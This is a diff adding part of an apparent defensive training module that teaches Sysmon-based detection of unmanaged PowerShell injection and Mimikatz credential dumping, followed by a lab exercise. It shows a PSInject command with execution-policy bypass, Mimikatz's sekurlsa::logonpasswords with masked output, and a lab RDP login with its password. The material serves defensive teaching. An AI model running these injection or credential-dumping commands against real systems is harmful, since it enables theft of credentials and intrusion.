@@ -87,4 +87,83 @@ As defenders, we can leverage this knowledge to detect unusual C# injections or 
 
 By using Process Hacker, we can observe a range of processes within our environment. Sorting the processes by name, we can identify interesting color-coded distinctions. Notably, "powershell.exe", a managed process, is highlighted in green compared to other processes. Hovering over powershell.exe reveals the label "Process is managed (.NET)," confirming its managed status.
 
-Examining the module loads for powershell.exe, by right-clicking on powersh
+Examining the module loads for powershell.exe, by right-clicking on powershell.exe, clicking "Properties", and navigating to "Modules", we can find relevant information.
+
+The presence of "Microsoft .NET Runtime...", clr.dll, and clrjit.dll should attract our attention. These 2 DLLs are used when C# code is ran as part of the runtime to execute the bytecode. If we observe these DLLs loaded in processes that typically do not require them, it suggests a potential execute-assembly or unmanaged PowerShell injection attack.
+
+To showcase unmanaged PowerShell injection, we can inject an unmanaged PowerShell-like DLL into a random process, such as spoolsv.exe. We can do that by utilizing the PSInject project in the following manner.
+
+```
+powershell -ep bypass
+Import-Module .\Invoke-PSInject.ps1
+Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
+```
+
+After the injection, we observe that "spoolsv.exe" transitions from an unmanaged to a managed state.
+
+Additionally, by referring to both the related "Modules" tab of Process Hacker and Sysmon Event ID 7, we can examine the DLL load information to validate the presence of the aforementioned DLLs.
+
+## Detection Example 3: Detecting Credential Dumping
+
+Another critical aspect of cybersecurity is detecting credential dumping activities. One widely used tool for credential dumping is Mimikatz, offering various methods for extracting Windows credentials. One specific command, "sekurlsa::logonpasswords", enables the dumping of password hashes or plaintext passwords by accessing the Local Security Authority Subsystem Service (LSASS). LSASS is responsible for managing user credentials and is a primary target for credential-dumping tools like Mimikatz.
+
+The attack can be executed as follows.
+
+```
+C:\Tools\Mimikatz> mimikatz.exe
+
+.#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+ '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1128191 (00000000:001136ff)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : DESKTOP-NU10MTO
+Logon Server      : DESKTOP-NU10MTO
+Logon Time        : 5/31/2023 4:14:41 PM
+SID               : S-1-5-21-2712802632-2324259492-1677155984-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+         * SHA1     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0812156b
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * Password : (null)
+        ssp :   KO
+        credman :
+```
+
+As we can see, the output of the "sekurlsa::logonpasswords" command provides powerful insights into compromised credentials.
+
+To detect this activity, we can rely on a different Sysmon event. Instead of focusing on DLL loads, we shift our attention to process access events. By checking Sysmon event ID 10, which represents "ProcessAccess" events, we can identify any suspicious attempts to access LSASS.
+
+For instance, if we observe a random file ("AgentEXE" in this case) from a random folder ("Downloads" in this case) attempting to access LSASS, it indicates unusual behavior. Additionally, the SourceUser being different from the TargetUser (e.g., "waldo" as the SourceUser and "SYSTEM" as the TargetUser) further emphasizes the abnormality. It's also worth noting that as part of the mimikatz-based credential dumping process, the user must request SeDebugPrivileges. As the name suggests, it's primarily used for debugging. This can be another Indicator of Compromise (IOC).
+
+Please note that some legitimate processes may access LSASS, such as authentication-related processes or security tools like AV or EDR.
+
+## Practical Exercises
+
+Navigate to the bottom of this section and click on Click here to spawn the target system!
+
+Then, RDP to [Target IP] using the provided credentials and answer the questions below. Do not forget to configure Sysmon accordingly, before you replicate the attacks.
+
+```
+z0x9n@htb[/htb]$ xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:[Target IP] /dynamic-resolution
+```
